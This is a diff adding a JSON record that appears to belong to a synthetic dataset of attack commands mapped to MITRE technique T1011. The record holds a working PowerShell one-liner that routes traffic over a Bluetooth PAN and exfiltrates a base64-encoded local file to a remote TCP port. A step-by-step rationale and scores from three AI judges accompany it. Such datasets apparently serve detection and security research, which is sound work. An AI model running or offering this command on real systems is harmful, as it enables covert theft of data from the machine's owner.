@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name=\"$($ad.Name)\" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()",
+  "explanation": "Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).",
+  "rationale_steps": [
+    "Connect Bluetooth NAP to use a different medium.",
+    "Set a static address on the Bluetooth adapter using netsh.",
+    "Add a host route bound to the Bluetooth interface index to force path selection.",
+    "Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1f794ee5",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, valid separators, and correct variable expansions.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with exfiltration over Bluetooth PAN in concept, but relies on likely non-admin-invokable IP/route changes, a questionable BluetoothCL /connect usage, and an incorrect gateway in the route command, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T01:40:13.339392Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, valid .NET method calls, correct string interpolation, and no syntax errors throughout the pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1011 by connecting a Bluetooth PAN adapter, assigning a static IP, pinning a host route to force traffic over the Bluetooth interface, reading and base64-encoding a file, then exfiltrating it via a TCP socket explicitly bound to the Bluetooth interface address — fully consistent with exfiltration over an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:12:11.668338Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid PowerShell syntax, correctly handles object properties, and properly sequences operations with semicolons.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic perfectly implements exfiltration over Bluetooth PAN, though the command requires administrative privileges to modify networking settings which contradicts the 'None' privilege metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:12:16.616115Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
